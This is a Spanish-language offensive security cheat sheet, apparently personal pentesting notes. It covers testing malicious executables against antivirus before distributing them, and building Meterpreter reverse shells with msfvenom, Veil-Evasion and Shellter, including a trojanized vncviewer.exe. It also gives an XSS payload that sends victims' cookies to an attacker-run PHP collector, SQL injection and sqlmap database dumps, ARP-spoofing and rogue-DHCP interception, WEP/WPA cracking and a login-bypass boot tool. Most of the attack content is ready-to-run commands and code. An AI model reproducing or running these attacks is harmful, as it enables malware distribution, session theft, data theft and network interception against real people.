Podemos ver si un archivo se detecta como malicioso para los antivirus  con  diversas aplicaciones como [virustotal](https://www.virustotal.com/gui/home/upload) o [nodistribute](https://nodistribute.com) , esto nos puede interesar a la hora de crear un ejecutable malicioso subirlo primero a una de estas aplicaciones,  comprobar su efectividad y distribuirlo si fuera necesario.

Hay que decir que virustotal tiene una base de datos de antivirus más grande, pero reporta a las empresa los virus detectados, así que según que quieras hacer es mejor no subirlo en dicha página. 



Con `msfvenom` podemos crear ejecutables maliciosos, el inconveniente es que casi todos los antivirus  lo detectan.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > /tmp/shell.exe
```



##### veil-evasion

Proporciona payloads con cripters, es decir aporta diferentes payloads con diferentes capas de encriptado para que los antivirus le cueste detectar que es un ejecutable malicioso.

**instalar** 

<u>dependencias:</u>

Install Python 2.7, Py2Exe, PyCrypto, and PyWin32 on a Windows computer (for Py2Exe).

<u>instalación:</u>

```bash
apt-get -y install git
git clone https://github.com/Veil-Framework/Veil-Evasion.git
cd Veil-Evasion/
cd setup
setup.sh -s 
```

<u>método de uso:</u>

```bash
python vail-evasion.py
list	# listar payloads
use 47	# utilizar payload 47
set lhost 10.0.0.5	# añadir opción requerida 
generate	# generar exe
```



##### shellter

Shellter es de las mejores opciones enmascarando un ejecutable malicioso, ya que permite introducir un ejecutable dentro de otro, por lo tanto el usuario abrirá el ejecutable interactuará con el programa principal, y en segundo plano nuestro ejecutable interno se ejecutara en segundo plano.

directorio de producción `/usr/share/shellter`

directorio donde encontramos los binarios de windows ` /usr/share/windows-binaries/` 

En el siguiente ejemplo introducimos un `reverse_tcp`  en un ejecutable `vnc`.



```bash
apt install shellter

cd /usr/share/shellter
cp /usr/share/windows-binaries/vncviewer.exe ./

shellter # abrir shelter
vncviewer.exe # binario a utilizar
Enable Stealth Mode? # habilitar que se ejecute el payload en segundo plano
Y
Use a listed payload or custom? # utilizare un payload de la lista
L
select payload by index: # el Meterpreter_reverse_TCP en lalista es el 1
1
set lhost 10.0.0.7 # donde se va a conectar
set lport 8888 # por que puerto
# ya podemos recoger nuestro archivo vncviewer.exe modificado del directorio actual.
```



**Usarlo:**

abrir puerto en linux

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.0.0.7
set lport 8888
exploit
```

ejecutar en un windows el vmviewer.exe que hemos modificado y se conectara automáticamente al linux en la consola del meterpreter.



#### Evadir autenticación

Existen diferentes formas de evadir la autenticación de sistemas operativos.

Una buena manera  en windows es con el programa `kon-bootcd` que es una iso booteable y ella sola se encarga de todo.

https://archive.org/details/Kon-bootForCD

También están otros métodos como DLC, Hirens y otros



Desde linux siempre esta la opción de arrancar en modo emergency siempre y cuando el grub te lo permita.



## vulnerabilidades en aplicaciones web

### Metodología

- Mapeo y análisis de la aplicación
  - Analizar toda la aplicación, detectar contenido oculto, identificar funcionalidades como put delete, identificar que tecnologías utiliza.

- Pruebas en los controles del cliente

- Pruebas en el mecanismo de autenticación
  - Analizar el proceso de autenticación, enumerar usuarios, funcionalidad recordar credenciales.

- Pruebas en el manejo de sesiones
  - Analizar la sesión que se crea, como y cuanto tarda, verificación de tokens y cookies, fijación de sesiones, *cross-site request fotgety* enlace malicioso que cambia credenciales de usuario etc..

- Pruebas en el control de autorización
  - Elevación privilegios vertical de user a admin etc.. o lateral de user1 a user2.

- Pruebas en la lógica de la aplicación
  - Pensar en algo que el desarrollador no aya pensado para modificar la web



### Ataques conocidos

[owasp](https://www.owasp.org/index.php/Main_Page) es un proyecto que facilita las auditorias en aplicaciones web, su propia web te facilita diferentes aplicaciones para auditar como para entrenar tus conocimientos.

[pentesterlab](https://pentesterlab.com/) es otra web donde practicar y encontrar recursos para auditorias.



#### Herramientas

[mantra](https://www.owasp.org/index.php/OWASP_Mantra_-_Security_Framework)  es un navegador tuneado donde encuentras una serie de plugins muy útiles para la auditoria web.

[burpsuit](https://portswigger.net/burp) , [zap proxy](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project),: Son proxys de intercepción de peticiones, con ellos podrás interceptar una petición , modificarla para luego mandarla con con las modificaciones asignadas.

[dirbuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project/es) fuerza bruta a contenido oculto de una web



#### xss

xss es un tipo de vulnerabilidad donde una aplicación web te permite ejecutar código en un cuadro de texto. Este vulnerabilidad es muy utilizada en aplicaciones como facebook, etc.. para extraer credenciales. Se manda un enlace con el código camuflado para que la victima clique y sin enterarse haga una acción en segundo plano.

<u>por ejemplo:</u>

En el siguiente ejemplo se ejecutara código en un cuadro de texto para extraer las cookies de un usuario y mandárselas remotamente a otro.

  

crear una web que ejecute php y insertar este archivo para recibir las cookies mediante url y  almacenarlas en cookies_list.txt

cookies.php

```php
<?php
    $handle=fopen("cookies_list.txt", "a");
	fputs($handle,"\n".$_GET["cookie"]."\n");
	fclose($handle);
?>
```

comprobar que funciona `10.1.1.3/cookies.php?cookie=test` 



código a inyectar mediante xss

```html
<script>var i=new Image();i.src="http://10.1.1.3/cookies.php?cookie="+document.cookie;</script>
```

este código hay que insertarlo dentro de algún cuadro de texto vulnerable y mediante un acortador de url como https://bitly.com/  crear un link.



Una vez recogidas las coockies, con mantra u otro insertarnos las cookies estraidas para acceder a la sesión de la victima.

##### Evasión de filtros

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion

https://html5sec.org/



#### sql injection

https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF

```
# extraer bases de datos
10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,schema_name,3,4,5+from+information_schema.schemata+--+-
existe la tabla exercises

# extraer tablas
10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,table_name,3,4,5+from+information_schema.tables+where+table_schema='exercises'+--+-
existe la tabla users

# extraer columnas
10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,column_name,3,4,5+from+information_schema.columns+where+table_name='users'+--+-

```



##### sqlmap

```bash
sqlmap -u "http://10.1.1.9/sqli/xample1.php?name=root"
sqlmap -u "http://10.1.1.9/sqli/xample1.php?name=root" --dbs
sqlmap -u "http://10.1.1.9/sqli/xample1.php?name=root" -D exercices --tables
sqlmap -u "http://10.1.1.9/sqli/xample1.php?name=root" -D exercices -T users --columns
sqlmap -u "http://10.1.1.9/sqli/xample1.php?name=root" -D exercices -T users --dump
sqlmap -u "http://10.1.1.9/sqli/xample1.php?name=root" --sql-shell
```



## vulnerabilidades en red

### Análisis de trafico 

Existen diferentes programas con los que podemos analizar el trafico en la red, el mas conocido  **wireshark** que analiza todo el trafico, también existen otros como **network miner** que de forma pasiva va extrayendo datos de los paquetes que van circulando por la red y mostrándolos de forma ordenada.



### intercepción de trafico *(man in the midle)*

De forma **manual** podemos ponernos entre medio de la victima y el router para interceptar todo el trafico de un dispositivo.

Siempre que estemos en una red local podemos indicar que nuestro dispositivo pueda hacer pas forwarding y seguidamente mediante `arpspoof` indicar a un host que nosotros somos el router.

```bash
echo "1" > /proc/sys/net/ipv4/ip_forward
# prg		interficie	victima	router
arpspoof -i eth0 -t 10.1.1.32 10.1.1.1
```

> realmente lo que hace `arpspoof` es mandar a la victima paquetes de que mi mac es la perteneciente va la ip del router.



De forma **automática** podemos utilizar `bettercap` que se encarga de realizar todo el proceso automáticamente, además de tener funcionalidades extra. 

```bash
arp-scan 10.1.1.0/24 # ver numero de dispositivos en una red
bettercap --help
bettercap -X # man in de middle a todos los dispositivos de la red
bettercap -T 10.1.1.32 --proxy -P POST # solo una victima
```



Desde windows existen programas como **cain** que podemos hacer el *man in de middle* fácilmente. Es un programa portable que solo tendrás que configurar la sección `apr` que será entre que dispositivos quieres estar y listo.



#### dhcp falso

```bash
echo "1" > /proc/sys/net/ipv4/ip_forward
msfconsole
use auxiliary/server/dhcp
show options
set broadcast 10.1.1.255
# rango a dar
set dhcpipend 10.1.1.200
set dhcpipstart 10.1.1.190

set dnsserver 8.8.8.8
set netmask 255.255.255.0

set router 10.1.1.22 # mi direccion ip, me are pasar por el router
set srvhost 10.11.22 # servidor dhcp
exploit
```



### vulnerabilidades wifi

**modo monitor** 

Este modo sirve para que nuestra tarjeta se ponga a la escucha del trafico de la red, no solo el nuestro si no el de todo el mundo si estamos en un entorno wifi.

```bash
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon # ver redes ssid bssid potencia de red chanel, etc...
airmon-ng stop wlan0mon
```



**redes wep**    

capturar pequetes red especifica

```bash
airodump-ng -c 6 --bssid  mac-del-router -w file-trafic wlan0mon
```

asociarte al punto de acceso

```bash
aireplay-ng -1 0 -e pruebas -a mac-del-router -h mac-cliente wlan0mon
```

escuchar paquetes arp

```bash
aireplay-ng -3 -b mac-router -h mac-cliente wlan0mon
```

desautenticar cliente

```bash
aireplay-ng -0 1 -a mac-router -c mac-cliente wlan0mon
```

craquear

```bash
aircrack-ng file-trafic
```



**redes wpa/wpa2**  

```bash
airmon-ng start wlan0
# extraer handshake y parar la escucha
airodump-ng -c 6 --bssid mac-router -w file-trafic-wpa wlan0mon
# intntar craquear handshake con diccionario local
aircrack-ng -w /usr/share/wordlists/rockyou.txt file-trafic-wpa 
```



**automático** 

De forma automática se puede intentar vulnerar una red con `wifite` ya vque por debajo esta utilizando `aircrack` . 

```bash
wifite
indicar en el listado la red
```

